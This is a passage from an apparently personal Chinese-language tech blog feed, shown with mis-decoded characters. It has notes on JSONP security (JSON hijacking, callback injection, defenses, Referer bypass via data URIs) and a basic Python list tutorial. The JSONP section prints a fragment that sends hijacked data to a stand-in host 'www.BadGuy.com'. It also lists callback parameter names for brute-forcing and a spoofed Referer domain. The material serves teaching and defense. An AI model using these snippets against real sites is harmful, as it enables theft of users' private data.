å¯¹è±¡è¡¨ç¤ºè¯­æ³•çš„å­é›†,è¯­æ³•å¾ˆç®€å•ï¼Œè¿™é‡Œä¸å†èµ˜è¿°ã€‚</p><h3 id="json-vs-xml"><a class="header-anchor" href="#json-vs-xml">ğŸ­</a>json vs xml</h3><h4 id="same"><a class="header-anchor" href="#same">ğŸ­</a>same:</h4><ul><li>å…·æœ‰&quot;è‡ªæˆ‘æè¿°æ€§&quot;ï¼ˆäººç±»å¯è¯»ï¼‰</li><li>å…·æœ‰å±‚çº§ç»“æ„ï¼ˆå€¼ä¸­å­˜åœ¨å€¼ï¼‰</li><li>æ•°æ®å¯ä½¿ç”¨ AJAX è¿›è¡Œä¼ è¾“</li></ul><h4 id="difference-jsonè§’åº¦"><a class="header-anchor" href="#difference-jsonè§’åº¦">ğŸ­</a>difference(jsonè§’åº¦):</h4><ul><li>æ²¡æœ‰ç»“æŸæ ‡ç­¾</li><li>è¯»å†™çš„é€Ÿåº¦æ›´å¿«</li><li>èƒ½å¤Ÿä½¿ç”¨å†…å»ºçš„ JavaScript eval() æ–¹æ³•è¿›è¡Œè§£æ</li><li>ä½¿ç”¨æ•°ç»„</li><li>ä¸ä½¿ç”¨ä¿ç•™å­—</li><li>ç®€çŸ­</li></ul><h1>jsonp</h1><p>Jsonp(<code>JSON with Padding</code>)</p><blockquote><p>æ˜¯ json çš„ä¸€ç§&quot;ä½¿ç”¨æ¨¡å¼&quot;ï¼Œå¯ä»¥è®©ç½‘é¡µä»åˆ«çš„åŸŸåï¼ˆç½‘ç«™ï¼‰é‚£è·å–èµ„æ–™ï¼Œå³è·¨åŸŸè¯»å–æ•°æ®ã€‚</p><p>æ˜¯ä¸€ç§éæ­£å¼ä¼ è¾“åè®®</p><p>å…è®¸ç”¨æˆ·ä¼ é€’ä¸€ä¸ªcallbackå‚æ•°ç»™æœåŠ¡ç«¯ï¼ŒæœåŠ¡ç«¯è¿”å›æ•°æ®æ—¶ä¼šå°†è¿™ä¸ªcallbackå‚æ•°ä½œä¸ºå‡½æ•°åæ¥åŒ…è£¹ä½JSONæ•°æ®ï¼Œæ•…å®¢æˆ·ç«¯å°±å¯ä»¥éšæ„å®šåˆ¶è‡ªå·±çš„å‡½æ•°æ¥è‡ªåŠ¨å¤„ç†è¿”å›æ•°æ®ã€‚</p></blockquote><p>ç”±æ¥(ç†è®º)ï¼š</p><ul><li>Ajaxç›´æ¥è¯·æ±‚æ™®é€šæ–‡ä»¶å­˜åœ¨è·¨åŸŸæ— æƒé™è®¿é—®çš„é—®é¢˜(å› ä¸º<strong>åŒæºç­–ç•¥</strong>è¯¦è§:<a href="https://developer.mozilla.org/zh-CN/docs/Web/Security/Same-origin_policy">æµè§ˆå™¨çš„åŒæºç­–ç•¥</a>)</li><li>ä½†Webé¡µé¢ä¸Šè°ƒç”¨jsæ–‡ä»¶æ—¶åˆ™ä¸å—æ˜¯å¦è·¨åŸŸçš„å½±å“ï¼ˆå¸¦æœ‰<code>src</code>å±æ€§çš„æ ‡ç­¾:<code>scriptã€imgã€iframe</code>éƒ½æ‹¥æœ‰è·¨åŸŸçš„èƒ½åŠ›ï¼‰ã€‚</li><li>æ•…ç°åœ¨æƒ³é€šè¿‡çº¯webç«¯ï¼ˆActiveXæ§ä»¶ã€æœåŠ¡ç«¯ä»£ç†ã€HTML5ä¹‹Websocketé™¤å¤–ï¼‰è·¨åŸŸè®¿é—®æ•°æ®å°±åªèƒ½åœ¨è¿œç¨‹æœåŠ¡å™¨ä¸ŠæŠŠæ•°æ®è£…è¿›jsæ ¼å¼çš„æ–‡ä»¶é‡Œï¼Œä¾›å®¢æˆ·ç«¯è°ƒç”¨å¤„ç†ï¼Œ</li><li>ç”±äºJSONç®€æ´è¢«jsæ”¯æŒï¼Œå®¢æˆ·ç«¯å¯ä»¥å¤„ç†è¿™ç§æ ¼å¼çš„æ•°æ®ï¼Œå› æ­¤è·¨åŸŸè°ƒç”¨è¿œç¨‹jsæ–‡ä»¶ï¼Œä¾¿å¯ä»¥å®ç°åŒæºç­–ç•¥ä¹‹ä¸‹çš„è·¨åŸŸ</li></ul><p>ä¸¾ä¸ªæ —å­:</p><p><img src="/2021/02/19/jsonp/1.png" alt="1"></p><p><code>jsonp.php</code>:</p><p><img src="/2021/02/19/jsonp/2.png" alt="2"></p><h2 id="JSONPåˆ©ç”¨"><a class="header-anchor" href="#JSONPåˆ©ç”¨">ğŸ­</a>JSONPåˆ©ç”¨</h2><h4 id="JSON-Hijacking"><a class="header-anchor" href="#JSON-Hijacking">ğŸ­</a>JSON Hijacking</h4><p>json åŠ«æŒåŸç†å…¶å®è·ŸCSRFä¸€æ ·ï¼ˆä½†æ˜¯CSRFæ˜¯æ¨¡æ‹Ÿç”¨æˆ·çš„èº«ä»½å»å‘é€è¯·æ±‚ï¼ŒJavaScript Hijackingæ˜¯æ¨¡æ‹Ÿç”¨æˆ·çš„èº«ä»½ï¼Œçªƒå–ç”¨æˆ·åœ¨æœåŠ¡å™¨ä¸Šçš„ç§éšä¿¡æ¯ï¼‰ï¼Œå½“æŸç½‘ç«™ä½¿ç”¨JSONPä¼ é€’æ•æ„Ÿæ•°æ®çš„æ—¶å€™ï¼Œæ”»å‡»è€…å¯ä»¥æ„é€ æ¶æ„JSONPè°ƒç”¨ç•Œé¢ï¼Œè¯±å¯¼è¢«æ”»å‡»è€…è®¿é—®ï¼š</p><p><img src="/2021/02/19/jsonp/3.png" alt="3"></p><h5 id="ç‰¹ç‚¹"><a class="header-anchor" href="#ç‰¹ç‚¹">ğŸ­</a>ç‰¹ç‚¹</h5><ul><li><p>æ¶æ„ç«™ç‚¹æ˜¯é€šè¿‡ç”¨æˆ·ç»™å®ƒè¿”å›ä¿¡ä»»ç½‘ç«™çš„JSONæ•°ç»„ï¼ˆJSONæ•°ç»„è¢«æµè§ˆå™¨è®¤ä¸ºæ˜¯ä¸€æ®µå¯æ‰§è¡Œçš„JavaScriptè„šæœ¬ï¼Œjsonå¯¹è±¡å°±ä¸è¢«è®¤ä¸ºæ˜¯JavaScriptè„šæœ¬ï¼‰è·å–ç”¨æˆ·ç§éšä¿¡æ¯ã€‚</p></li><li><p>æ¶æ„ç«™ç‚¹å¿…é¡»å®å…ˆçŸ¥é“ç”¨æˆ·è¿”å›çš„JSONçš„ç»“æ„</p></li><li><p>æ¶æ„ç«™ç‚¹åªèƒ½å‘é€GETè¯·æ±‚</p></li><li><p>éœ€è¦æµè§ˆå™¨æ”¯æŒ</p><p>JSON åŠ«æŒä»£ç è¦åœ¨jsonpåŸºç¡€ä¸ŠåŠ ä¸Šå¦‚ä¸‹ä»£ç ï¼ˆå‘é€getè¯·æ±‚ï¼‰</p><pre><code class="hljs accesslog">req.open(<span class="hljs-string">&quot;<span class="hljs-keyword">GET</span>&quot;</span>, <span class="hljs-string">&quot;http://www.BadGuy.com?obj=&quot;</span> +escape(objString),true); &#125; req.send(null); );</code></pre><p>åœ¨å‡½æ•°å®šä¹‰æ˜¯å¼•ç”¨<code>Object.prototype.__defineSetter__</code>å‡½æ•°:å¯¹Objectçš„æŸå±æ€§è®¾ç½®ä¸€ä¸ªHook(ç±»ä¼¼äºJavaScriptå‡½æ•°åŠ«æŒ)ï¼Œå½“æœ‰å¯¹è±¡è®¾ç½®å®ƒçš„è¯¥å±æ€§æ—¶ï¼Œéƒ½ä¼šè§¦å‘ä¸Šé¢è¿™æ®µä»£ç çš„è¿è¡Œã€‚ä½†æ˜¯æ­¤å‡½æ•°åœ¨ç°åœ¨å¤šæ•°æµè§ˆå™¨ä¸­éƒ½å¤±æ•ˆäº†ã€‚</p></li></ul><h5 id="é˜²å¾¡"><a class="header-anchor" href="#é˜²å¾¡">ğŸ­</a>é˜²å¾¡</h5><ul><li>ç»¼åˆé˜²å¾¡ï¼šåˆ¤æ–­<code>reference</code>å’Œæ·»åŠ éšæœºå­—ä¸²</li><li>ä½¿ç”¨åŠ åœ¨urlä¸­çš„<code>token</code></li></ul><h5 id="æŒ–æ˜"><a class="header-anchor" href="#æŒ–æ˜">ğŸ­</a>æŒ–æ˜</h5><blockquote><p>burpæŠ“åŒ…ï¼Œjsonpæ•°æ®ä¼ è¾“ä¼šåœ¨mimetypeä¸­æ˜¾ç¤ºä¸ºscript<br>æ§åˆ¶å°æŸ¥æ‰¾jsonpåŒ…<br>æš´åŠ›ç©·ä¸¾</p><blockquote><p>å¤šæ•°æƒ…å†µä¸‹ä¼šæŠŠjsonpçš„å›ä¼ å‚æ•°å‘½åä¸ºcallbackï¼Œä½†ä¹Ÿå¯èƒ½å˜å½¢ï¼ˆcallbackå‚æ•°å¯è‡ªå®šä¹‰ï¼‰æˆå¦‚ä¸‹å½¢å¼:</p><blockquote><p>callback=attack</p><p>cb=attack</p><p>call=attack</p><p>jsonp=attack</p><p>jsonpcallback=attack</p><p>jsonpcb=attack</p><p>json=attack</p><p>jsoncallback=attack</p><p>jcb=attack</p></blockquote></blockquote></blockquote><h4 id="åŸºç¡€å‡½æ•°è°ƒç”¨"><a class="header-anchor" href="#åŸºç¡€å‡½æ•°è°ƒç”¨">ğŸ­</a>åŸºç¡€å‡½æ•°è°ƒç”¨</h4><p>è‹¥å›è°ƒå‡½æ•°è¢«ç¡¬ç¼–ç è¿›å“åº”(å³å¤šä¸ªä¸åŒç±»å‹çš„è¯·æ±‚éƒ½é‡‡ç”¨åŒæ ·çš„å›è°ƒå‡½æ•°å)ï¼Œå°±ä¼šå­˜åœ¨åŸºç¡€å‡½æ•°è°ƒç”¨çš„å±å®³ã€‚</p><h5 id="é˜²å¾¡-v2"><a class="header-anchor" href="#é˜²å¾¡-v2">ğŸ­</a>é˜²å¾¡</h5><p>ä¸¥æ ¼é™åˆ¶å¯¹ JSONP è¾“å‡º<code>callback</code>å‡½æ•°åçš„é•¿åº¦ï¼Œå‡½æ•°è°ƒç”¨åä¸å¯é¢„æµ‹</p><h4 id="callbackå‡½æ•°å¯å®šä¹‰çš„å®‰å…¨é—®é¢˜"><a class="header-anchor" href="#callbackå‡½æ•°å¯å®šä¹‰çš„å®‰å…¨é—®é¢˜">ğŸ­</a>callbackå‡½æ•°å¯å®šä¹‰çš„å®‰å…¨é—®é¢˜</h4><p>åœ¨ä¸Šé¢çš„å®ä¾‹ä¸­callbackå‡½æ•°çš„åç§°å¯ä»¥è‡ªå®šä¹‰ï¼Œå½“å®ƒæ²¡æœ‰ä¸¥æ ¼è¿‡æ»¤æˆ–å®¡æŸ¥ï¼Œä¹Ÿä¼šæˆä¸ºä¸€ä¸ªæ³¨å…¥ç‚¹ï¼š</p><p><img src="/2021/02/19/jsonp/4.png" alt="4"></p><h5 id="é˜²å¾¡-v3"><a class="header-anchor" href="#é˜²å¾¡-v3">ğŸ­</a>é˜²å¾¡</h5><ul><li>ä¸¥æ ¼å®šä¹‰<code> Content-Type: application / json</code>ï¼šæµè§ˆå™¨ä¸è§£ææ¶æ„æ’å…¥çš„ XSS ä»£ç </li><li>è¿‡æ»¤ callback ä»¥åŠ JSON æ•°æ®è¾“å‡º</li><li>åœ¨è¯·æ±‚ä¸­æ·»åŠ  csrfToken å¹¶åœ¨åç«¯è¿›è¡ŒéªŒè¯</li></ul><p><strong>Content-Type ä¸ X-Content-Type-Optionsï¼š</strong></p><p>å¦‚æœåœ¨å“åº”ä¸­APIè¯·æ±‚å¤´X-Content-Type-Optionsè¢«è®¾ç½®ä¸ºnosniffï¼Œ<strong>Content-Typeå¿…é¡»è®¾ç½®ä¸ºJavaScript</strong>(text/javascript, application/javascript, text/ecmascriptç­‰.)æ‰èƒ½åœ¨æ‰€æœ‰æµè§ˆå™¨ä¸­è¿è¡Œ,å¦‚æœæ²¡æœ‰è®¾ç½®X-Content-Type-Options: nosniffå¤´ï¼Œå®ƒèƒ½åœ¨æ‰€æœ‰çš„æµè§ˆå™¨ä¸‹å·¥ä½œ,æ•…åœ¨ä¸€äº›æ—§çš„æµè§ˆå™¨ä¸­å¯ä»¥ç»•è¿‡ã€‚</p><h2 id="ç»•è¿‡"><a class="header-anchor" href="#ç»•è¿‡">ğŸ­</a>ç»•è¿‡</h2><p>ï¼ˆå½“é˜²å¾¡æ–¹å¼æ˜¯åˆ¤æ–­<code>reference</code>æ˜¯å¦ä¸ºå¯ä¿¡æ¥æºæˆ–æ·»åŠ éšæœºå€¼æ—¶ï¼‰</p><blockquote><p><em><code>reference</code>ä¼ªé€ (<a href="http://qq.com.evil.com">qq.com.evil.com</a>)</em><br><em>æš´åŠ›ç©·ä¸¾</em><br><em>ç©ºreference</em>:</p><blockquote><p>æ„é€ ä¸€ä¸ªä¸å¸¦HTTP Refererçš„è¯·æ±‚:åˆ©ç”¨data URI(<strong>Data URLs</strong>ï¼Œå³å‰ç¼€ä¸º <code>data:</code> åè®®çš„URLï¼Œå…¶å…è®¸å†…å®¹åˆ›å»ºè€…å‘æ–‡æ¡£ä¸­åµŒå…¥å°æ–‡ä»¶)</p><p>Data URLs ç”±å››ä¸ªéƒ¨åˆ†ç»„æˆï¼šå‰ç¼€(<code>data:</code>)ã€æŒ‡ç¤ºæ•°æ®ç±»å‹çš„MIMEç±»å‹ã€*å¦‚æœéæ–‡æœ¬åˆ™ä¸ºå¯é€‰çš„<code>base64</code>æ ‡è®°,å¦‚æœæ•°æ®æ˜¯æ–‡æœ¬ç±»å‹ï¼Œå¯ä»¥ç›´æ¥å°†æ–‡æœ¬åµŒå…¥ (æ ¹æ®æ–‡æ¡£ç±»å‹ï¼Œä½¿ç”¨åˆé€‚çš„å®ä½“å­—ç¬¦æˆ–è½¬ä¹‰å­—ç¬¦ã€‚å¦‚æœæ˜¯äºŒè¿›åˆ¶æ•°æ®ï¼Œå¯å°†æ•°æ®è¿›è¡Œbase64ç¼–ç ä¹‹åå†è¿›è¡ŒåµŒå…¥ã€*æ•°æ®æœ¬èº«ï¼š</p><pre><code class="hljs markdown">&gt;&gt;data:[<span class="hljs-string">&lt;mediatype&gt;</span>][<span class="hljs-symbol">;base64</span>],<span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">data</span>&gt;</span></span></code></pre><p>å¤„ç†çš„ä»£ç åŒ…å«äº†å¼•å·ï¼ŒåŒå¼•å·ï¼Œä»¥åŠå…¶ä»–ä¸€äº›è¢«é˜»æ­¢çš„è¯­å¥ï¼Œæ¥ç€ä½¿ç”¨base64ç¼–ç payloadï¼ˆå›è°ƒå‡½æ•°å®šä¹‰ä»¥åŠè„šæœ¬ï¼‰å³å¯è¾¾åˆ°referenceç»•è¿‡</p><p>å¯ä½¿ç”¨çš„æ ‡ç­¾ï¼š</p><blockquote><p>iframe (åœ¨srcå±æ€§ä¸­)<br>embed (åœ¨srcå±æ€§ä¸­)<br>object (åœ¨dataå±æ€§ä¸­)</p></blockquote></blockquote></blockquote><p>ç»“æŸâ¤ï¸â¤ï¸â¤ï¸</p><p>å‚è€ƒï¼š<a href="https://www.runoob.com/json/json-jsonp.html">JSONPæ•™ç¨‹|èœé¸Ÿæ•™ç¨‹</a></p><p><a href="https://www.dazhuanlan.com/2020/01/29/5e31a80b198fd/">JSONPæ³¨å…¥åˆ©ç”¨ä¸é˜²å¾¡</a></p><p><a href="https://www.jianshu.com/p/6fd8486f6f8b">jsonåŠjsonpæ³¨å…¥</a></p><p><a href="https://www.freebuf.com/articles/web/126347.html">JSONPæ³¨å…¥è§£æ</a></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>python(äºŒ)</title>
    <link href="/2021/02/18/python2/"/>
    <url>/2021/02/18/python2/</url>
    
    <content type="html"><![CDATA[<p>ä¹‹å‰åœ¨sqli-labsçš„SQLç›²æ³¨è¯´æœ‰æ—¶é—´è¦å­¦ä¹ ä¸€ä¸‹ç¼–å†™pythonè„šæœ¬æ¥è·‘ç›²æ³¨å…³å¡ï¼Œä½†æ˜¯pythonåŸºç¡€è¯­æ³•è¿˜æ²¡å­¦å®Œï¼Œä»Šå¤©æ¥å¡«å‘ğŸ‘»ğŸ‘»ğŸ‘»</p><h2 id="åˆ—è¡¨"><a class="header-anchor" href="#åˆ—è¡¨">ğŸ­</a>åˆ—è¡¨</h2><ul><li><p>åˆ—è¡¨å¯ä»¥ç´¢å¼•ï¼Œåˆ‡ç‰‡ï¼ŒåŠ ï¼Œä¹˜ï¼Œæ£€æŸ¥æˆå‘˜</p></li><li><p>åˆ—è¡¨å¯ä»¥ä½œä¸ºä¸€ä¸ªæ–¹æ‹¬å·å†…çš„é€—å·åˆ†éš”å€¼å‡ºç°</p></li><li><p>åˆ—è¡¨çš„æ•°æ®é¡¹ä¸éœ€è¦å…·æœ‰ç›¸åŒçš„ç±»å‹</p></li><li><p>åˆ›å»ºä¸€ä¸ªåˆ—è¡¨ï¼Œåªè¦æŠŠé€—å·åˆ†éš”çš„ä¸åŒçš„æ•°æ®é¡¹ä½¿ç”¨æ–¹æ‹¬å·æ‹¬èµ·æ¥å³å¯</p><pre><code class="hljs ini"><span class="hljs-attr">list</span> = [<span class="hljs-string">&#x27;genius&#x27;</span>, <span class="hljs-string">&#x27;rose&#x27;</span>, <span class="hljs-number">233</span>, <span class="hljs-number">8080</span>]</code></pre></li></ul><h4 id="è®¿é—®å€¼"><a class="header-anchor" href="#è®¿é—®å€¼">ğŸ­</a>è®¿é—®å€¼</h4><ul><li><p>åˆ—è¡¨ç´¢å¼•ä¹Ÿæ˜¯ä» 0 å¼€å§‹ï¼Œç¬¬äºŒä¸ªç´¢å¼•æ˜¯ 1</p></li><li><p>ä¹Ÿå¯ä»¥ä»å°¾éƒ¨å¼€å§‹ï¼Œæœ€åä¸€ä¸ªå…ƒç´ çš„ç´¢å¼•ä¸º -1ï¼Œå¾€å‰ä¸€ä½ä¸º -2</p></li><li><p>ä¹Ÿå¯ä»¥ä½¿ç”¨æ–¹æ‹¬å· [] çš„å½¢å¼æˆªå–å­—ç¬¦</p><pre><code class="hljs angelscript">nums = [<span class="hljs-number">10</span>, <span class="hljs-number">20</span>, <span class="hljs-number">30</span>, <span class="hljs-number">40</span>, <span class="hljs-number">50</span>, <span class="hljs-number">60</span>, <span class="hljs-number">70</span>, <span class="hljs-number">80</span>, <span class="hljs-number">90</span>]print(nums[<span class="hljs-number">0</span>:<span class="hljs-number">4</span>])<span class="hljs-comment">//è¾“å‡ºç»“æœ:10, 20, 30, 40(nums[0:4]ä¸­çš„4ç´¢å¼•ä½ä¸åŒ…æ‹¬)</span></code></pre></li></ul><p>è®¿é—®è§„åˆ™ä¸å­—ç¬¦ä¸²ç±»ä¼¼ï¼Œä¸å†èµ˜è¿°</p><h4 id="æ›´æ–°"><a class="header-anchor" href="#æ›´æ–°">ğŸ­</a>æ›´æ–°</h4><pre><code class="hljs angelscript">list[<span class="hljs-number">2</span>] = <span class="hljs-number">2001</span><span class="hljs-comment">//ç›´æ¥æ›´æ–°</span></code></pre><p>ä¹Ÿå¯ä»¥ä½¿ç”¨ append() æ–¹æ³•æ¥æ·»åŠ åˆ—è¡¨é¡¹</p><h4 id="åˆ é™¤"><a class="header-anchor" href="#åˆ é™¤">ğŸ­</a>åˆ é™¤</h4><pre><code class="hljs angelscript">del list[<span class="hljs-number">2</span>]<span class="hljs-comment">//åˆ é™¤ç¬¬ä¸‰ä¸ªå…ƒç´ </span></code></pre><h4 id="è„šæœ¬æ“ä½œç¬¦"><a class="header-anchor" href="#è„šæœ¬æ“ä½œç¬¦">ğŸ­</a>è„šæœ¬æ“ä½œç¬¦</h4><p>+ å·ç”¨äºç»„åˆåˆ—è¡¨ï¼Œ* å·ç”¨äºé‡å¤åˆ—è¡¨ï¼ˆä¸å­—ç¬¦ä¸²ç±»ä¼¼)</p><table><thead><tr><th>è¡¨è¾¾å¼</th><th>ä½œç”¨</th></tr></thead><tbody><tr><td>len([1, 2, 3])</td><td>æ±‚é•¿åº¦</td></tr><tr><td>[1, 2, 3] + [4, 5, 6]</td><td>ç»„åˆ</td></tr><tr><td>[â€˜Hi!â€™] * 4</td><td>é‡å¤</td></tr><tr><td>3 in [1, 2, 3]</td><td>åˆ¤æ–­å…ƒç´ æ˜¯å¦å­˜åœ¨äºåˆ—è¡¨ä¸­</td></tr><tr><td>for x in [1, 2, 3]: print(x, end=&quot; &quot;)</td><td>è¿­ä»£</td></tr></tbody></table><p>åˆ—è¡¨çš„åµŒå¥—ï¼Œæˆªå–ä¸æ‹¼æ¥ä¹‹å‰æåˆ°ä¸å†èµ˜è¿°</p><table><thead><tr><th>å‡½æ•°/æ–¹æ³•</th><th>ä½œç”¨</th></tr></thead><tbody><tr><td>list(seq)</td><td>å°†å…ƒç»„è½¬æ¢ä¸ºåˆ—è¡¨</td></tr><tr><td>list.append(obj)</td><td>åœ¨åˆ—è¡¨æœ«å°¾æ·»åŠ æ–°çš„å¯¹è±¡</td></tr><tr><td>list.count(obj)</td><td>ç»Ÿè®¡æŸä¸ªå…ƒç´ åœ¨åˆ—è¡¨ä¸­å‡ºç°çš„æ¬¡æ•°</td></tr><tr><td>list.extend(seq)</td><td>åœ¨åˆ—è¡¨æœ«å°¾ä¸€æ¬¡æ€§è¿½åŠ å¦ä¸€ä¸ªåºåˆ—ä¸­çš„å¤šä¸ªå€¼ï¼ˆç”¨æ–°åˆ—è¡¨æ‰©å±•åŸæ¥çš„åˆ—è¡¨ï¼‰</td></tr><tr><td>list.index(obj)</td><td>ä»åˆ—è¡¨ä¸­æ‰¾å‡ºæŸä¸ªå€¼ç¬¬ä¸€ä¸ªåŒ¹é…é¡¹çš„ç´¢å¼•ä½ç½®</td></tr><tr><td>list.insert(index, obj)</td><td>å°†å¯¹è±¡æ’å…¥åˆ—è¡¨</td></tr><tr><td>list.pop([index=-1])</td><td>ç§»é™¤åˆ—è¡¨ä¸­çš„ä¸€ä¸ªå…ƒç´ ï¼ˆé»˜è®¤æœ€åä¸€ä¸ªå…ƒç´ ï¼‰ï¼Œå¹¶ä¸”è¿”å›è¯¥å…ƒç´ çš„å€¼</td></tr><tr><td>list.remove(obj)</td><td>ç§»é™¤åˆ—è¡¨ä¸­æŸä¸ªå€¼çš„ç¬¬ä¸€ä¸ªåŒ¹é…é¡¹</td></tr><tr><td>list.reverse()</td><td>åå‘åˆ—è¡¨ä¸­å…ƒç´ </td></tr><tr><td>list.sort( key=None, reverse=False)</td><td>å¯¹åŸåˆ—è¡¨è¿›è¡Œæ’åº</td></tr><tr><td>list.clear()</td><td>æ¸…ç©ºåˆ—è¡¨</td></tr><tr><td>list.copy()</td><td>å¤åˆ¶åˆ—è¡¨</td></tr><tr><td>list.sort()</td><td>å‡åºæ’åº</td></tr><tr><td>list.sort(reverse=Ture)</td><td>é™åºæ’åº</td></tr></tbody></table><h4 id="å°†åˆ—è¡¨å½“åšå †æ ˆä½¿ç”¨"><a class="header-anchor" href="#å°†åˆ—è¡¨å½“åšå †æ ˆä½¿ç”¨">ğŸ­</a>å°†åˆ—è¡¨å½“åšå †æ ˆä½¿ç”¨</h4><p>åˆ—è¡¨æ–¹æ³•ä½¿å¾—åˆ—è¡¨å¯ä»¥å¾ˆæ–¹ä¾¿çš„ä½œä¸ºä¸€ä¸ªå †æ ˆæ¥ä½¿ç”¨ï¼Œå †æ ˆä½œä¸ºç‰¹å®šçš„æ•°æ®ç»“æ„ï¼Œæœ€å…ˆè¿›å…¥çš„å…ƒç´ æœ€åä¸€ä¸ªè¢«é‡Šæ”¾ï¼ˆåè¿›å…ˆå‡ºï¼‰ã€‚ç”¨ append() æ–¹æ³•å¯ä»¥æŠŠä¸€ä¸ªå…ƒç´ æ·»åŠ åˆ°å †æ ˆé¡¶ã€‚ç”¨ä¸æŒ‡å®šç´¢å¼•çš„ pop() æ–¹æ³•å¯ä»¥æŠŠä¸€ä¸ªå…ƒç´ ä»å †æ ˆé¡¶é‡Šæ”¾å‡ºæ¥ã€‚</p><img src="/2021/02/18/python2/5.jpg" alt="5" style="zoom:50%;"><h4 id="å°†åˆ—è¡¨å½“ä½œé˜Ÿåˆ—ä½¿ç”¨"><a class="header-anchor" href="#å°†åˆ—è¡¨å½“ä½œé˜Ÿåˆ—ä½¿ç”¨">ğŸ­</a>å°†åˆ—è¡¨å½“ä½œé˜Ÿåˆ—ä½¿ç”¨</h4><p>åœ¨é˜Ÿåˆ—é‡Œç¬¬ä¸€åŠ å…¥çš„å…ƒç´ ï¼Œç¬¬ä¸€ä¸ªå–å‡ºæ¥ï¼›ä½†æ•ˆç‡ä¸é«˜ã€‚åœ¨åˆ—è¡¨çš„æœ€åæ·»åŠ æˆ–è€…å¼¹å‡ºå…ƒç´ é€Ÿåº¦å¿«ï¼Œåœ¨åˆ—è¡¨é‡Œæ’å…¥æˆ–è€…ä»å¤´éƒ¨å¼¹å‡ºé€Ÿåº¦å´ä¸å¿«ï¼ˆå› ä¸ºæ‰€æœ‰å…¶ä»–çš„å…ƒç´ éƒ½å¾—ä¸€ä¸ªä¸€ä¸ªåœ°ç§»åŠ¨ï¼‰</p><h4 id="åˆ—è¡¨æ¨å¯¼å¼"><a class="header-anchor" href="#åˆ—è¡¨æ¨å¯¼å¼">ğŸ­</a>åˆ—è¡¨æ¨å¯¼å¼</h4><p>åˆ—è¡¨æ¨å¯¼å¼æä¾›äº†ä»åºåˆ—åˆ›å»ºåˆ—è¡¨çš„ç®€å•é€”å¾„ã€‚é€šå¸¸åº”ç”¨ç¨‹åºå°†ä¸€äº›æ“ä½œåº”ç”¨äºæŸä¸ªåºåˆ—çš„æ¯ä¸ªå…ƒç´ ï¼Œç”¨å…¶è·å¾—çš„ç»“æœä½œä¸ºç”Ÿæˆæ–°åˆ—è¡¨çš„å…ƒç´ ï¼Œæˆ–è€…æ ¹æ®ç¡®å®šçš„åˆ¤å®šæ¡ä»¶åˆ›å»ºå­åºåˆ—ã€‚</p><img src="/2021/02/18/python2/6.jpg" alt="6" style="zoom:80%;"><p>å…ƒç»„ä¹‹å‰ä»‹ç»è¿‡äº†ï¼Œè¿™é‡Œè¡¥å……ï¼š</p><ul><li>å…ƒç»„ä¸­åªåŒ…å«ä¸€ä¸ªå…ƒç´ æ—¶ï¼Œéœ€è¦åœ¨å…ƒç´ åé¢æ·»åŠ é€—å·ï¼Œå¦åˆ™æ‹¬å·ä¼šè¢«å½“ä½œè¿ç®—ç¬¦ä½¿ç”¨</li><li>å…ƒç»„çš„ä¸å¯å˜æŒ‡çš„æ˜¯å…ƒç»„æ‰€æŒ‡å‘çš„å†…å­˜ä¸­çš„å†…å®¹ä¸å¯å˜</li></ul><p>å­—å…¸è¡¥å……ï¼š</p><p>é”®å¿…é¡»ä¸å¯å˜ï¼Œå¯ä»¥ç”¨æ•°å­—ï¼Œå­—ç¬¦ä¸²æˆ–å…ƒç»„å……å½“ï¼Œè€Œç”¨åˆ—è¡¨å°±ä¸è¡Œã€‚</p><p>é›†åˆè¡¥å……ï¼š</p> <pre><code class="hljs gradle">basket = &#123;<span class="hljs-string">&#x27;apple&#x27;</span>, <span class="hljs-string">&#x27;orange&#x27;</span>, <span class="hljs-string">&#x27;apple&#x27;</span>, <span class="hljs-string">&#x27;pear&#x27;</span>, <span class="hljs-string">&#x27;orange&#x27;</span>, <span class="hljs-string">&#x27;banana&#x27;</span>&#125;<span class="hljs-keyword">print</span>(basket)<span class="hljs-comment">//å»é‡åŠŸèƒ½</span>&#123;<span class="hljs-string">&#x27;orange&#x27;</span>, <span class="hljs-string">&#x27;banana&#x27;</span>, <span class="hljs-string">&#x27;pear&#x27;</span>, <span class="hljs-string">&#x27;apple&#x27;</span>&#125;<span class="hljs-string">&#x27;orange&#x27;</span> in basket <span class="hljs-comment">//å¿«é€Ÿåˆ¤æ–­å…ƒç´ æ˜¯å¦åœ¨é›†åˆå†…</span><span class="hljs-keyword">True</span><span class="hljs-string">&#x27;crabgrass&#x27;</span> in basket<span class="hljs-keyword">False</span></code></pre><p>éšæœºåˆ é™¤é›†åˆä¸­çš„ä¸€ä¸ªå…ƒç´ (å¯¹é›†åˆè¿›è¡Œæ— åºçš„æ’åˆ—ï¼Œç„¶åå°†è¿™ä¸ªæ— åºæ’åˆ—é›†åˆçš„å·¦é¢ç¬¬ä¸€ä¸ªå…ƒç´ è¿›è¡Œåˆ é™¤)</p>  <pre><code class="hljs css"><span class="hljs-selector-tag">s</span><span class="hljs-selector-class">.pop</span>()</code></pre><h4 id="end-å…³é”®å­—"><a class="header-anchor" href="#end-å…³é”®å­—">ğŸ­</a>end å…³é”®å­—</h4><p>å°†ç»“æœè¾“å‡ºåˆ°åŒä¸€è¡Œï¼Œæˆ–è€…åœ¨è¾“å‡ºçš„æœ«å°¾æ·»åŠ ä¸åŒçš„å­—ç¬¦</p><h2 id="è¯­å¥"><a class="header-anchor" href="#è¯­å¥">ğŸ­</a>è¯­å¥</h2><h4 id="if-è¯­å¥"><a class="header-anchor" href="#if-è¯­å¥">ğŸ­</a>if è¯­å¥</h4><pre><code class="hljs gcode"><span class="hljs-keyword">if</span> co<span class="hljs-symbol">ndition_1</span>:    stateme<span class="hljs-symbol">nt_block_1</span>elif co<span class="hljs-symbol">ndition_2</span>:    stateme<span class="hljs-symbol">nt_block_2</span>else:    stateme<span class="hljs-symbol">nt_block_3</span></code></pre><p><strong>æ³¨æ„ï¼š</strong></p><ul><li>æ¯ä¸ªæ¡ä»¶åé¢è¦ä½¿ç”¨å†’å·</li><li>ä½¿ç”¨ç¼©è¿›æ¥åˆ’åˆ†è¯­å¥å—ï¼Œç›¸åŒç¼©è¿›æ•°çš„è¯­å¥åœ¨ä¸€èµ·ç»„æˆä¸€ä¸ªè¯­å¥å—ã€‚</li><li>åœ¨Pythonä¸­æ²¡æœ‰switch â€“ caseè¯­å¥</li></ul><h4 id="forå¾ªç¯"><a class="header-anchor" 